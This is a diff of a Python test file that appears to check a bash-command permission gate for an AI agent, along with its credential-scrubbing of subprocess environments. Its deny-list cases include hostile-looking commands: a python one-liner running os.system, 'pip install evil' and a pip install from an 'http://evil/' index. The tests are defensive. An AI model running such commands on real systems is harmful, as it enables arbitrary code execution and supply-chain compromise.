@@ -75,12 +75,8 @@ class TestArgvAllowlist:
         assert tier_bash_command("git commit -m x", rules).tier == "deny"
 
     def test_push_prompts_only_at_deploy(self) -> None:
-        assert tier_bash_command("git push", _build_rules(PermissionMode.DEPLOY)).tier == (
-            "prompt"
-        )
-        assert tier_bash_command("git push", _build_rules(PermissionMode.BUILD)).tier == (
-            "deny"
-        )
+        assert tier_bash_command("git push", _build_rules(PermissionMode.DEPLOY)).tier == ("prompt")
+        assert tier_bash_command("git push", _build_rules(PermissionMode.BUILD)).tier == ("deny")
 
 
 class TestAceBinariesDenied:
@@ -97,7 +93,7 @@ class TestAceBinariesDenied:
         "command",
         [
             "python3 x.py",
-            'python -c "__import__(\'os\').system(\'id\')"',
+            "python -c \"__import__('os').system('id')\"",
             "python2 x.py",
             "pip install evil",
             "pip3 install --index-url http://evil/ pkg",
@@ -185,9 +181,7 @@ class TestScrubbedEnv:
         assert "sk-should-not-leak" not in result.stdout
         assert result.stdout.strip() == ""
 
-    def test_no_credential_var_survives_into_subprocess(
-        self, tmp_path: Path
-    ) -> None:
+    def test_no_credential_var_survives_into_subprocess(self, tmp_path: Path) -> None:
         """The invariant: no credential-shaped var reaches the bash env.
 
         Plant a warehouse password, a ``*_TOKEN``, and a ``*_SECRET`` in
@@ -305,7 +299,5 @@ class TestGateBashIntegration:
 
     def test_gate_prompt_tier_with_approver_allows(self) -> None:
         gate = PermissionGate(build_policy(PermissionMode.DEPLOY))
-        decision = gate.check(
-            "bash", {"command": "git push"}, approver=lambda _n, _i: True
-        )
+        decision = gate.check("bash", {"command": "git push"}, approver=lambda _n, _i: True)
         assert decision.outcome is Outcome.ALLOW
